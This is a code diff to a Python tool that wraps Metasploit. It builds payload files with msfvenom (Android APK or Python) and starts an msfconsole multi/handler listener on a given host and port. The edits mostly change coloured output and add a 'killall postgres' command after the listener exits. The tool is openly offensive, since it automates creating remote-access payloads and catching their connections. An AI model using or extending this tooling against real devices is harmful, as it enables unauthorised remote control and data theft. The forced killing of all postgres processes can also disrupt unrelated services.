@@ -92,7 +92,7 @@ def console(payload,host="127.0.0.1",port="4444"):
     """
     print_console(host,port,payload)
     sleep(7)
-    print("["+col("Y")+"Preparing for listerning"+col()+"]")
+    print("[ "+col("Y")+"Preparing for listerning"+col()+" ]"+col("C"))
     call(["msfconsole","-q","-x","use exploit/multi/handler;set lhost "+host+";set lport "+port+";set payload "+payload+";exploit;"])
 
 def Payload(payload,name,host,port):
@@ -111,16 +111,16 @@ def Payload(payload,name,host,port):
     if payload[:5] == "andro":
         if name[-3:]!= ".apk":
             name=name+".apk"
-        print("[ {P}Apk file{N} ]: ".format(P=P,N=N)+pwd()+"/"+name)
+        print("{N}[ {P}Apk file{N} ]: ".format(P=P,N=N)+pwd()+"/"+name)
 
     if payload[:5] == "pytho":
         if name[-3:]!= ".py":
             name=name+".py"
-        print("[ {P}Python file{N} ]: ".format(P=P,N=N)+pwd()+"/"+name)
+        print("{N}[ {P}Python file{N} ]: ".format(P=P,N=N)+pwd()+"/"+name)
 
-    print("[{G}*{N}] Generating payload.".format(G=col("G"),N=col()))
+    print("{N}[{G}*{N}] Generating payload.".format(G=col("G"),N=col()))
     os.system("msfvenom -p "+payload+" lhost="+host+" lport="+port+" r"+">"+name)
-    print("[ {Y}Payload{N} ] Created sucessfully.".format(Y=col("Y"),N=col()))
+    print("{N}[ {Y}Payload{N} ] Created sucessfully.".format(Y=col("Y"),N=col()))
     chdir(cd)
 
 
@@ -242,6 +242,9 @@ def Load(Name="",List=List):
                     T1=Thread(target=Payload,args=(List[i],name,host,port))
                     T1.start()
                     console(List[i],host,port)
+                    print(col("C"))
+                    os.system("killall postgres 2>/dev/null")
+                    print("\n\n"+col())
                     raise SystemExit()
                     break
             _inp_=""
